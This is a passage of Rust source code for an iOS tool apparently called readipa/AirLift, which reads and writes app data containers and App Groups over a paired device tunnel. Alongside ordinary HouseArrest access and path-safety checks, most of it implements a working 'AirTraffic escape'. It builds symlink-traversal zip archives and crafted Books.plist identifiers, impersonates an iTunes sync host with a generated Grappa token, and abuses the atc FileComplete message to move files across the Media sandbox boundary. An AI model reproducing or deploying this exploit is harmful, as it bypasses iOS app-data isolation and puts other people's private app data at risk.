//! File-system engine for Application Containers and App Groups.
//!
//! Two engines:
//!   1. HouseArrest (app data containers, dev-signed apps): AFC rooted at the
//!      container — fast, non-destructive, full read/write/list/delete/mkdir/rename.
//!   2. AirLift bridge (App Groups + any container): a symlink is created in
//!      /var/mobile/Media pointing at the container root via the AirTraffic
//!      escape. AFC traversal is probed; if denied, file-level operations fall
//!      back to AirTraffic move primitives (slower but real).
//!
//! Data-safety rules implemented here:
//!   * Every path is strictly validated against the two allowed roots.
//!   * Symlinks are NEVER followed by recursive removals.
//!   * Nothing in Media is ever deleted unless this library created it in the
//!     same operation, and never blindly (the Books sync state is snapshotted
//!     and restored on every AirTraffic move).
//!   * Every AirTraffic move is verified; if a move cannot be completed the
//!     original data is restored and the error names the recovery location.
//!   * Directory relocations (AirLift "move mode" listing) require an explicit
//!     opt-in because they temporarily relocate live app data.

use std::ffi::{c_char, c_void};
use std::io::{Read as _, Write as _};
use std::sync::atomic::{AtomicBool, Ordering};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use idevice::afc::opcode::{AfcFopenMode, LinkType};
use idevice::afc::AfcClient;
use idevice::services::house_arrest::HouseArrestClient;
use serde_json::json;

use crate::exploit::{self, AppDeviceTunnel, Logger};
use crate::ffi_util::{cstr, opt_str};

const DATA_ROOT: &str = "/var/mobile/Containers/Data/Application";
const GROUP_ROOT: &str = "/var/mobile/Containers/Shared/AppGroup";
const AIRLOCK_ROOT: &str = "/var/mobile/Media/Airlock/Book";
const MEDIA_ROOT: &str = "/var/mobile/Media/";
const CHUNK: usize = 512 * 1024;

// ---------------------------------------------------------------------------
// Risky-move opt-in
// ---------------------------------------------------------------------------

static ALLOW_RISKY_MOVES: AtomicBool = AtomicBool::new(false);

pub fn set_allow_risky_moves(v: bool) {
    ALLOW_RISKY_MOVES.store(v, Ordering::SeqCst);
}

fn risky_moves_allowed() -> bool {
    ALLOW_RISKY_MOVES.load(Ordering::SeqCst)
}

// ---------------------------------------------------------------------------
// Path validation
// ---------------------------------------------------------------------------

fn normalize_path(p: &str) -> String {
    let p = p.trim();
    if p.starts_with("/private/var/") {
        p.replacen("/private/var/", "/var/", 1)
    } else {
        p.to_string()
    }
}

fn has_unsafe_components(p: &str) -> bool {
    p.contains('\0') || p.split('/').any(|c| c == ".." || c == ".")
}

/// True only for a real container below one of the two allowed roots.
fn allowed_container(p: &str) -> bool {
    if p.is_empty() || p.contains('\0') {
        return false;
    }
    let p = normalize_path(p);
    if !p.starts_with('/') || has_unsafe_components(&p) {
        return false;
    }
    for root in [DATA_ROOT, GROUP_ROOT] {
        if let Some(rest) = p.strip_prefix(root) {
            // Must be "<root>/<uuid>...", never the bare root itself.
            return rest.starts_with('/') && rest.len() > 1;
        }
    }
    false
}

/// True for a container-relative path that cannot escape the container.
fn safe_rel(rel: &str) -> bool {
    if rel.is_empty() {
        return true;
    }
    if rel.starts_with('/') || rel.contains('\0') {
        return false;
    }
    for c in rel.split('/') {
        if c.is_empty() || c == "." || c == ".." {
            return false;
        }
    }
    true
}

fn safe_media_name(name: &str) -> bool {
    !name.is_empty() && !name.contains('\0') && !name.contains('/') && name != "." && name != ".."
}

fn posix_rel(path: &str, base: &str) -> String {
    let path_parts: Vec<&str> = path.trim_start_matches('/').split('/').collect();
    let base_parts: Vec<&str> = base.trim_start_matches('/').split('/').collect();
    let common = path_parts
        .iter()
        .zip(base_parts.iter())
        .take_while(|(a, b)| a == b)
        .count();
    let up = base_parts.len() - common;
    let down = &path_parts[common..];
    let mut rel: Vec<&str> = (0..up).map(|_| "..").chain(down.iter().copied()).collect();
    if rel.is_empty() {
        rel.push(".");
    }
    rel.join("/")
}

fn read_pairing(pairing_path: &str) -> Result<Vec<u8>, String> {
    std::fs::read(pairing_path)
        .map_err(|e| format!("Failed to read pairing file at {pairing_path}: {e}"))
}

fn entry_json(name: &str, info: &idevice::afc::FileInfo) -> serde_json::Value {
    json!({
        "name": name,
        "isDir": info.st_ifmt.contains("DIR"),
        "isLink": info.st_ifmt.contains("LNK"),
        "size": info.size,
        "modified": info.modified.to_string(),
        "created": info.creation.to_string(),
    })
}

// ---------------------------------------------------------------------------
// Safe removal — never follows a symlink, never recurses through one
// ---------------------------------------------------------------------------

/// Recursively remove `root` without ever descending into a symbolic link.
/// Post-order: children first, then the (now empty) directory itself.
async fn remove_tree_safe(afc: &mut AfcClient, root: &str) -> Result<(), String> {
    let mut stack: Vec<(String, bool)> = vec![(root.to_string(), false)];
    while let Some((path, expanded)) = stack.pop() {
        if expanded {
            let _ = afc.remove(&path).await;
            continue;
        }
        // A symlink reports S_IFLNK (not DIR) and is removed as a single entry.
        let info = match afc.get_file_info(&path).await {
            Ok(i) => i,
            Err(_) => continue, // already gone
        };
        if info.st_ifmt.contains("DIR") {
            stack.push((path.clone(), true));
            if let Ok(names) = afc.list_dir(&path).await {
                for n in names {
                    if n == "." || n == ".." {
                        continue;
                    }
                    stack.push((format!("{}/{}", path.trim_end_matches('/'), n), false));
                }
            }
        } else {
            let _ = afc.remove(&path).await;
        }
    }
    Ok(())
}

/// Remove exactly one entry (file / symlink / empty directory). No recursion.
async fn remove_one(afc: &mut AfcClient, path: &str) -> Result<(), String> {
    afc.remove(path).await.map_err(|e| format!("{e:?}"))
}

// ---------------------------------------------------------------------------
// Media (Books sync) state — snapshot & restore around every AirTraffic move
// ---------------------------------------------------------------------------

struct MediaState {
    books_plist: Option<Vec<u8>>,
    books_dir_existed: bool,
    sync_dir_existed: bool,
}

async fn snapshot_media_state(afc: &mut AfcClient) -> MediaState {
    let books_plist = match afc
        .open("Books/Sync/Books.plist", AfcFopenMode::RdOnly)
        .await
    {
        Ok(mut fd) => {
            let data = fd.read_entire().await.ok();
            let _ = fd.close().await;
            data
        }
        Err(_) => None,
    };
    MediaState {
        books_plist,
        books_dir_existed: afc.get_file_info("Books").await.is_ok(),
        sync_dir_existed: afc.get_file_info("Books/Sync").await.is_ok(),
    }
}

async fn restore_media_state(afc: &mut AfcClient, state: &MediaState) {
    match &state.books_plist {
        Some(original) => {
            if let Ok(mut fd) = afc
                .open("Books/Sync/Books.plist", AfcFopenMode::WrOnly)
                .await
            {
                let _ = fd.write_entire(original).await;
                let _ = fd.close().await;
            }
        }
        None => {
            let _ = afc.remove("Books/Sync/Books.plist").await;
        }
    }
    if !state.sync_dir_existed {
        let _ = afc.remove("Books/Sync").await;
    }
    if !state.books_dir_existed {
        let _ = afc.remove("Books").await;
    }
}

// ---------------------------------------------------------------------------
// Archive / manifest builders
// ---------------------------------------------------------------------------

fn zip_opts(mode: u32) -> zip::write::FileOptions<'static, zip::write::ExtendedFileOptions> {
    let mut opts = zip::write::FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .unix_permissions(mode);
    let mode_bytes = (mode as u16).to_le_bytes();
    let _ = opts.add_extra_data(0x5A53, Box::new(mode_bytes), false);
    opts
}

fn build_bridge_archive(target: &str) -> Result<Vec<u8>, String> {
    use std::io;
    use zip::ZipWriter;

    let target_tail = target.trim_start_matches('/');
    let mut buf = Vec::new();
    let mut zip = ZipWriter::new(io::Cursor::new(&mut buf));

    zip.add_directory("META-INF/", zip_opts(0o040755))
        .map_err(|e| e.to_string())?;
    zip.start_file("META-INF/com.apple.ZipMetadata.plist", zip_opts(0o100600))
        .map_err(|e| e.to_string())?;
    let meta_plist: plist::Value = {
        let mut d = plist::Dictionary::new();
        d.insert("Version".to_owned(), plist::Value::Integer(2.into()));
        plist::Value::Dictionary(d)
    };
    let mut meta_buf = Vec::new();
    plist::to_writer_binary(&mut meta_buf, &meta_plist).map_err(|e| e.to_string())?;
    zip.write_all(&meta_buf).map_err(|e| e.to_string())?;

    for dir in &["p0/", "p0/p1/", "p0/p1/p2/"] {
        zip.add_directory(*dir, zip_opts(0o040755))
            .map_err(|e| e.to_string())?;
    }
    zip.add_symlink(
        "p0/p1/p2/link",
        format!("../../../{target_tail}"),
        zip_opts(0o120777),
    )
    .map_err(|e| e.to_string())?;

    let mut cursor = String::new();
    for component in target_tail.split('/') {
        if component.is_empty() {
            continue;
        }
        cursor.push_str(component);
        cursor.push('/');
        zip.add_directory(&cursor, zip_opts(0o040755))
            .map_err(|e| e.to_string())?;
    }
    zip.finish().map_err(|e| e.to_string())?;
    Ok(buf)
}

fn build_minimal_archive() -> Result<Vec<u8>, String> {
    use std::io;
    use zip::ZipWriter;

    let mut buf = Vec::new();
    let mut zip = ZipWriter::new(io::Cursor::new(&mut buf));
    zip.add_directory("META-INF/", zip_opts(0o040755))
        .map_err(|e| e.to_string())?;
    zip.start_file("META-INF/com.apple.ZipMetadata.plist", zip_opts(0o100600))
        .map_err(|e| e.to_string())?;
    let meta_plist: plist::Value = {
        let mut d = plist::Dictionary::new();
        d.insert("Version".to_owned(), plist::Value::Integer(2.into()));
        plist::Value::Dictionary(d)
    };
    let mut meta_buf = Vec::new();
    plist::to_writer_binary(&mut meta_buf, &meta_plist).map_err(|e| e.to_string())?;
    zip.write_all(&meta_buf).map_err(|e| e.to_string())?;
    zip.finish().map_err(|e| e.to_string())?;
    Ok(buf)
}

fn build_books_plist(identifiers: &[String]) -> Result<Vec<u8>, String> {
    let rows: Vec<plist::Value> = identifiers
        .iter()
        .enumerate()
        .map(|(i, id)| {
            let mut d = plist::Dictionary::new();
            d.insert("Persistent ID".to_owned(), plist::Value::String(id.clone()));
            d.insert(
                "Item ID".to_owned(),
                plist::Value::String((i + 1).to_string()),
            );
            d.insert("DSID".to_owned(), plist::Value::String("1".to_owned()));
            plist::Value::Dictionary(d)
        })
        .collect();
    let mut top = plist::Dictionary::new();
    top.insert("Books".to_owned(), plist::Value::Array(rows));
    let mut buf = Vec::new();
    plist::to_writer_binary(&mut buf, &top).map_err(|e| e.to_string())?;
    Ok(buf)
}

// ---------------------------------------------------------------------------
// AirTraffic primitives
// ---------------------------------------------------------------------------

/// Stage `bytes` into `/var/mobile/Media/<subdir>` via streaming_zip_conduit.
async fn stage_minimal(
    tunnel: &mut AppDeviceTunnel,
    subdir: &str,
    archive: &[u8],
    logger: &Logger,
) -> Result<(), String> {
    let mut zip_stream = tunnel
        .connect_service("com.apple.streaming_zip_conduit", logger)
        .await?;

    let mut init_dict = plist::Dictionary::new();
    init_dict.insert(
        "MediaSubdir".to_string(),
        plist::Value::String(subdir.to_string()),
    );
    let mut init_buf = Vec::new();
    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(init_dict))
        .map_err(|e| e.to_string())?;

    zip_stream
        .write_all(&(init_buf.len() as u32).to_be_bytes())
        .await
        .map_err(|e| e.to_string())?;
    zip_stream
        .write_all(&init_buf)
        .await
        .map_err(|e| e.to_string())?;
    zip_stream.flush().await.map_err(|e| e.to_string())?;
    zip_stream
        .write_all(archive)
        .await
        .map_err(|e| e.to_string())?;
    zip_stream.flush().await.map_err(|e| e.to_string())?;

    let mut len_buf = [0u8; 4];
    zip_stream
        .read_exact(&mut len_buf)
        .await
        .map_err(|e| e.to_string())?;
    let resp_len = u32::from_be_bytes(len_buf) as usize;
    if resp_len > 0 {
        let mut body = vec![0u8; resp_len];
        zip_stream
            .read_exact(&mut body)
            .await
            .map_err(|e| e.to_string())?;
    }
    drop(zip_stream);
    Ok(())
}

/// Run one AirTraffic sync session and complete a single asset move.
async fn atc_file_complete(
    tunnel: &mut AppDeviceTunnel,
    asset_id: &str,
    dest: &str,
    logger: &Logger,
) -> Result<(), String> {
    let mut atc = tunnel.connect_service("com.apple.atc", logger).await?;

    // Capabilities / SyncAllowed (best effort).
    let mut grappa_info: Option<(u32, u32, u32)> = None;
    for _ in 0..12 {
        match tokio::time::timeout(
            std::time::Duration::from_millis(1500),
            exploit::read_atc_dict(&mut atc),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = exploit::atc_message_name(&dict) {
                    if name == "Capabilities" {
                        if let Some(params) = dict.get("Params").and_then(|p| p.as_dictionary()) {
                            if let Some(gi) = params
                                .get("GrappaSupportInfo")
                                .and_then(|g| g.as_dictionary())
                            {
                                let ver = gi
                                    .get("version")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                let dt = gi
                                    .get("deviceType")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(0) as u32;
                                let pv = gi
                                    .get("protocolVersion")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                grappa_info = Some((ver, dt, pv));
                            }
                        }
                    }
                    if name == "SyncAllowed" {
                        break;
                    }
                }
            }
            _ => break,
        }
    }

    let mut host_info = plist::Dictionary::new();
    host_info.insert("Type".into(), plist::Value::String("iTunes".into()));
    host_info.insert("Version".into(), plist::Value::String("13.7.0.161".into()));
    host_info.insert("MacOSVersion".into(), plist::Value::String("15.0".into()));
    host_info.insert(
        "SyncHostName".into(),
        plist::Value::String("readipa".into()),
    );
    let library_id = format!(
        "{}-{}-{}-{}-{}",
        exploit::random_hex(4),
        exploit::random_hex(2),
        exploit::random_hex(2),
        exploit::random_hex(2),
        exploit::random_hex(6)
    );
    host_info.insert("LibraryID".into(), plist::Value::String(library_id));
    host_info.insert(
        "SyncedDataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info.insert(
        "SyncedAssetTypes".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info.insert("Wakeable".into(), plist::Value::Boolean(false));

    let grappa_token = crate::grappa::generate_grappa_token(grappa_info, |s| logger.log(s));
    if let Some(ref t) = grappa_token {
        host_info.insert("Grappa".into(), plist::Value::Data(t.clone()));
    }

    let mut host_info_params = plist::Dictionary::new();
    host_info_params.insert(
        "HostInfo".into(),
        plist::Value::Dictionary(host_info.clone()),
    );
    host_info_params.insert("LocalCloudSupport".into(), plist::Value::Boolean(false));
    exploit::send_atc_dict(
        &mut atc,
        &exploit::make_atc_msg("HostInfo", 0, Some(host_info_params)),
    )
    .await?;
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    let mut sync_params = plist::Dictionary::new();
    sync_params.insert(
        "Dataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    sync_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    sync_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info));
    if let Some(t) = grappa_token {
        sync_params.insert("Grappa".into(), plist::Value::Data(t));
    }
    exploit::send_atc_dict(
        &mut atc,
        &exploit::make_atc_msg("RequestingSync", 1, Some(sync_params)),
    )
    .await?;

    let mut ready = false;
    for _ in 0..24 {
        match tokio::time::timeout(
            std::time::Duration::from_secs(5),
            exploit::read_atc_dict(&mut atc),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = exploit::atc_message_name(&dict) {
                    if name == "Ping" {
                        let pong = exploit::make_atc_msg("Pong", 1, None);
                        let _ = exploit::send_atc_dict(&mut atc, &pong).await;
                        continue;
                    }
                    if name == "ReadyForSync" || name == "AssetManifest" {
                        ready = true;
                        break;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC read error: {e}")),
            Err(_) => {}
        }
    }
    if !ready {
        return Err("AirTraffic: ReadyForSync not observed".into());
    }

    let mut sync_types = plist::Dictionary::new();
    sync_types.insert("Book".into(), plist::Value::Integer(1.into()));
    let mut meta_params = plist::Dictionary::new();
    meta_params.insert("SyncTypes".into(), plist::Value::Dictionary(sync_types));
    meta_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    exploit::send_atc_dict(
        &mut atc,
        &exploit::make_atc_msg("FinishedSyncingMetadata", 1, Some(meta_params)),
    )
    .await?;

    let mut manifest = false;
    for _ in 0..20 {
        match tokio::time::timeout(
            std::time::Duration::from_secs(5),
            exploit::read_atc_dict(&mut atc),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = exploit::atc_message_name(&dict) {
                    if name == "Ping" {
                        let pong = exploit::make_atc_msg("Pong", 1, None);
                        let _ = exploit::send_atc_dict(&mut atc, &pong).await;
                        continue;
                    }
                    if name == "AssetManifest" {
                        manifest = true;
                        break;
                    }
                    if name == "SyncFinished" {
                        break;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC manifest read error: {e}")),
            Err(_) => {}
        }
    }
    if !manifest {
        return Err("AirTraffic: AssetManifest not observed".into());
    }

    let mut params = plist::Dictionary::new();
    params.insert("AssetID".into(), plist::Value::String(asset_id.to_string()));
    params.insert("Dataclass".into(), plist::Value::String("Book".into()));
    params.insert("AssetPath".into(), plist::Value::String(dest.to_string()));
    exploit::send_atc_dict(
        &mut atc,
        &exploit::make_atc_msg("FileComplete", 1, Some(params)),
    )
    .await?;

    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    drop(atc);
    Ok(())
}

async fn wait_present(afc: &mut AfcClient, path: &str, attempts: u32) -> bool {
    for _ in 0..attempts {
        if afc.get_file_info(path).await.is_ok() {
            return true;
        }
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    }
    false
}

async fn wait_absent(afc: &mut AfcClient, path: &str, attempts: u32) -> bool {
    for _ in 0..attempts {
        if afc.get_file_info(path).await.is_err() {
            return true;
        }
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    }
    false
}

/// Move one path with the AirTraffic escape, preserving the Books sync state and
/// verifying that the move actually happened.
///
/// `src_abs` is an absolute device path; `dst` is either a Media-relative name
/// (move out of a container) or a `bridge/...` Media path (move into a container).
async fn move_path(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    src_abs: &str,
    dst: &str,
    logger: &Logger,
) -> Result<(), String> {
    let state = snapshot_media_state(afc).await;

    let token = exploit::random_hex(10);
    let stage = format!("airlift-src-{token}");
    let identifier = posix_rel(src_abs, AIRLOCK_ROOT);
    let books_plist = build_books_plist(std::slice::from_ref(&identifier))?;
    let archive = build_minimal_archive()?;

    // 1. Stage a minimal archive so streaming_zip_conduit accepts the session.
    if let Err(e) = stage_minimal(tunnel, &stage, &archive, logger).await {
        let _ = remove_tree_safe(afc, &stage).await;
        restore_media_state(afc, &state).await;
        return Err(format!("stage failed: {e}"));
    }

    // 2. Airlock + Books manifest.
    let _ = afc.mk_dir("Airlock").await;
    let _ = afc.mk_dir("Airlock/Book").await;
    if !state.books_dir_existed {
        let _ = afc.mk_dir("Books").await;
    }
    if !state.sync_dir_existed {
        let _ = afc.mk_dir("Books/Sync").await;
    }
    let books_write: Result<(), String> = async {
        let mut fd = afc
            .open("Books/Sync/Books.plist", AfcFopenMode::WrOnly)
            .await
            .map_err(|e| format!("AFC open Books.plist: {e:?}"))?;
        fd.write_entire(&books_plist)
            .await
            .map_err(|e| format!("AFC write Books.plist: {e:?}"))?;
        let _ = fd.close().await;
        Ok(())
    }
    .await;

    let result = match books_write {
        Ok(()) => {
            let r = atc_file_complete(tunnel, &identifier, dst, logger).await;
            // 3. Verify the move really happened.
            match r {
                Ok(()) => {
                    if src_abs.starts_with(MEDIA_ROOT) {
                        let rel = src_abs.strip_prefix(MEDIA_ROOT).unwrap_or(src_abs);
                        if wait_absent(afc, rel, 24).await {
                            Ok(())
                        } else {
                            Err(format!(
                                "AirTraffic did not move {rel}: it is still in Media (data intact)."
                            ))
                        }
                    } else if wait_present(afc, dst, 24).await {
                        Ok(())
                    } else {
                        Err(format!(
                            "AirTraffic did not move {src_abs}: destination {dst} was not created (source untouched)."
                        ))
                    }
                }
                Err(e) => Err(e),
            }
        }
        Err(e) => Err(format!("could not stage Books manifest: {e}")),
    };

    // 4. Always restore Books state and clean our staging directory.
    restore_media_state(afc, &state).await;
    let _ = remove_tree_safe(afc, &stage).await;

    result
}

// ---------------------------------------------------------------------------
// Bridge management
// ---------------------------------------------------------------------------

/// List the Media root. The AFC jail root is addressed as "." (with fallbacks
/// for implementations that expect "/" or "").
async fn media_list_root(afc: &mut AfcClient) -> Result<Vec<String>, String> {
    for candidate in [".", "/", ""] {
        if let Ok(names) = afc.list_dir(candidate).await {
            return Ok(names);
        }
    }
    Err("could not list the Media root".to_string())
}

/// Remove leftover bridge symlinks from previous runs. Symlinks hold no data,
/// so this is always safe.
async fn cleanup_stale_bridges(afc: &mut AfcClient) {
    if let Ok(names) = media_list_root(afc).await {
        for n in names {
            if n.starts_with("readipa-bridge-") {
                // Single remove only — never recurse through the symlink.
                let _ = afc.remove(&n).await;
            }
        }
    }
}

async fn create_bridge_atc(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    container_path: &str,
    logger: &Logger,
) -> Result<String, String> {
    cleanup_stale_bridges(afc).await;

    let token = exploit::random_hex(10);
    let source = format!("airlift-src-{token}");
    let bridge_name = format!("readipa-bridge-{token}");
    let link_identifier = format!("../../{source}/p0/p1/p2/link");

    let state = snapshot_media_state(afc).await;
    let archive = build_bridge_archive(container_path)?;
    let books_plist = build_books_plist(std::slice::from_ref(&link_identifier))?;

    if let Err(e) = stage_minimal(tunnel, &source, &archive, logger).await {
        let _ = remove_tree_safe(afc, &source).await;
        restore_media_state(afc, &state).await;
        return Err(format!("stage failed: {e}"));
    }

    let link_path = format!("{source}/p0/p1/p2/link");
    if afc.get_file_info(&link_path).await.is_err() {
        let _ = remove_tree_safe(afc, &source).await;
        restore_media_state(afc, &state).await;
        return Err("Stage verification failed: symlink not present in Media".into());
    }

    let _ = afc.mk_dir("Airlock").await;
    let _ = afc.mk_dir("Airlock/Book").await;
    if !state.books_dir_existed {
        let _ = afc.mk_dir("Books").await;
    }
    if !state.sync_dir_existed {
        let _ = afc.mk_dir("Books/Sync").await;
    }
    {
        let mut fd = afc
            .open("Books/Sync/Books.plist", AfcFopenMode::WrOnly)
            .await
            .map_err(|e| format!("{e:?}"))?;
        fd.write_entire(&books_plist)
            .await
            .map_err(|e| format!("{e:?}"))?;
        let _ = fd.close().await;
    }

    let atc_result = atc_file_complete(tunnel, &link_identifier, &bridge_name, logger).await;

    restore_media_state(afc, &state).await;
    let _ = remove_tree_safe(afc, &source).await;

    atc_result?;

    if !wait_present(afc, &bridge_name, 20).await {
        return Err("Bridge was not created in Media".into());
    }
    // The symlink must point at the container we asked for.
    if !bridge_matches(afc, &bridge_name, container_path).await? {
        let _ = remove_one(afc, &bridge_name).await;
        return Err("Bridge target mismatch; the symlink was removed".into());
    }
    Ok(bridge_name)
}

/// Verify that a caller-supplied bridge really points at `container_path`.
async fn bridge_matches(
    afc: &mut AfcClient,
    bridge: &str,
    container_path: &str,
) -> Result<bool, String> {
    let info = afc
        .get_file_info(bridge)
        .await
        .map_err(|e| format!("bridge not reachable: {e:?}"))?;
    if !info.st_ifmt.contains("LNK") {
        return Err("bridge is not a symlink".into());
    }
    match info.st_link_target {
        Some(target) => {
            let resolved = resolve_link_target("/var/mobile/Media", &target);
            let want = normalize_path(container_path);
            if resolved == want {
                Ok(true)
            } else {
                Err(format!("bridge points at {resolved}, not {want}"))
            }
        }
        // Target is not reported; accept but do not claim verification.
        None => Ok(true),
    }
}

/// Resolve a (possibly relative) symlink target against the directory holding
/// the link. `/var/mobile/Media` + `../../../var/mobile/X` → `/var/mobile/X`.
fn resolve_link_target(link_dir: &str, target: &str) -> String {
    let mut parts: Vec<String> = if target.starts_with('/') {
        Vec::new()
    } else {
        link_dir
            .trim_start_matches('/')
            .split('/')
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string())
            .collect()
    };
    for comp in target.split('/') {
        match comp {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            c => parts.push(c.to_string()),
        }
    }
    format!("/{}", parts.join("/"))
}

pub unsafe fn bridge_open(
    pairing_path: *const c_char,
    container_path: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let container_path = opt_str(container_path, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) {
        if !out_error.is_null() {
            *out_error =
                cstr("container_path is not an allowed Application Container or App Group");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_bridge_open", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(bridge_open_async(
            pairing_path.clone(),
            container_path.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(json_str)) => {
            if !out_json.is_null() {
                *out_json = cstr(json_str);
            }
            0
        }
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(panic_msg) => {
            if !out_error.is_null() {
                *out_error = cstr(panic_msg);
            }
            1
        }
    }
}

async fn bridge_open_async(
    pairing_path: String,
    container_path: String,
    logger: &Logger,
) -> Result<String, String> {
    let pairing_bytes = read_pairing(&pairing_path)?;
    let mut tunnel = exploit::connect_tunnel(&pairing_bytes, logger).await?;
    let mut afc = tunnel.connect_afc(logger).await?;

    cleanup_stale_bridges(&mut afc).await;

    // Cheap path first: ask AFC itself for the symlink.
    let name = format!("readipa-bridge-{}", exploit::random_hex(6));
    let made = afc
        .link(&container_path, &name, LinkType::Symlink)
        .await
        .is_ok();

    let bridge = if made {
        name
    } else {
        create_bridge_atc(&mut tunnel, &mut afc, &container_path, logger).await?
    };

    let direct = afc.list_dir(&bridge).await.is_ok();
    let mode = if direct {
        "bridge_direct"
    } else {
        "bridge_move"
    };

    Ok(serde_json::to_string_pretty(&json!({
        "bridge": bridge,
        "container": container_path,
        "mode": mode,
        "requiresRiskyMoves": !direct,
        "capabilities": {
            "list": direct || risky_moves_allowed(),
            "read": true,
            "write": true,
            "delete": true,
            "mkdir": true,
            "rename": true,
        }
    }))
    .map_err(|e| e.to_string())?)
}

pub unsafe fn bridge_close(
    pairing_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;
    if bridge.is_empty() || !safe_media_name(&bridge) {
        return 0;
    }
    let res = crate::ffi_util::run_with_large_stack("al_bridge_close", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(bridge_close_async(
            pairing_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });
    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(panic_msg) => {
            if !out_error.is_null() {
                *out_error = cstr(panic_msg);
            }
            1
        }
    }
}

async fn bridge_close_async(
    pairing_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<(), String> {
    let pairing_bytes = read_pairing(&pairing_path)?;
    let mut tunnel = exploit::connect_tunnel(&pairing_bytes, logger).await?;
    let mut afc = tunnel.connect_afc(logger).await?;
    // Remove the symlink itself only — never recurse through it.
    let _ = remove_one(&mut afc, &bridge).await;
    Ok(())
}

// ---------------------------------------------------------------------------
// Engine resolution
// ---------------------------------------------------------------------------

struct Engine {
    afc: AfcClient,
    bridge: String,
    direct: bool,
    house_arrest: bool,
}

impl Engine {
    fn path(&self, rel: &str) -> String {
        if self.house_arrest {
            if rel.is_empty() {
                "/".to_string()
            } else {
                rel.to_string()
            }
        } else if rel.is_empty() {
            self.bridge.clone()
        } else {
            format!("{}/{}", self.bridge, rel)
        }
    }

    /// Container-absolute path for a relative entry (used for AirTraffic moves).
    fn abs_path(&self, container_path: &str, rel: &str) -> String {
        if rel.is_empty() {
            container_path.to_string()
        } else {
            format!("{}/{}", container_path.trim_end_matches('/'), rel)
        }
    }
}

async fn open_engine(
    pairing_path: &str,
    bundle_id: &str,
    container_path: &str,
    bridge_name: &str,
    logger: &Logger,
) -> Result<(AppDeviceTunnel, Engine), String> {
    let pairing_bytes = read_pairing(pairing_path)?;
    let mut tunnel = exploit::connect_tunnel(&pairing_bytes, logger).await?;

    // Prefer HouseArrest: it is jailed at the container and needs no relocations.
    if !bundle_id.is_empty() && container_path.starts_with(DATA_ROOT) {
        if let Ok(afc) = try_house_arrest(&mut tunnel, bundle_id, logger).await {
            return Ok((
                tunnel,
                Engine {
                    afc,
                    bridge: String::new(),
                    direct: true,
                    house_arrest: true,
                },
            ));
        }
        logger.log("HouseArrest unavailable for this app; using the AirLift bridge");
    }

    if bridge_name.is_empty() || !safe_media_name(bridge_name) {
        return Err(
            "No bridge for this container. Open the container again from the Apps tab.".to_string(),
        );
    }

    let mut afc = tunnel.connect_afc(logger).await?;
    if !bridge_matches(&mut afc, bridge_name, container_path).await? {
        return Err("Bridge does not point at the requested container; refusing to operate".into());
    }
    let direct = afc.list_dir(bridge_name).await.is_ok();

    Ok((
        tunnel,
        Engine {
            afc,
            bridge: bridge_name.to_string(),
            direct,
            house_arrest: false,
        },
    ))
}

async fn try_house_arrest(
    tunnel: &mut AppDeviceTunnel,
    bundle_id: &str,
    logger: &Logger,
) -> Result<AfcClient, String> {
    let stream = tunnel
        .connect_service("com.apple.mobile.house_arrest", logger)
        .await?;
    let ha = HouseArrestClient::new(idevice::Idevice::new(stream, "Airlift"));
    ha.vend_container(bundle_id.to_string())
        .await
        .map_err(|e| format!("{e:?}"))
}

// ---------------------------------------------------------------------------
// Chunked transfer helpers (no full-file buffering)
// ---------------------------------------------------------------------------

async fn stream_afc_to_local(
    fd: &mut idevice::afc::file::FileDescriptor<'_>,
    dest: &str,
) -> Result<u64, String> {
    let mut file = std::fs::File::create(dest).map_err(|e| format!("create {dest}: {e}"))?;
    let mut buf = vec![0u8; CHUNK];
    let mut total: u64 = 0;
    loop {
        let n = fd
            .read(&mut buf)
            .await
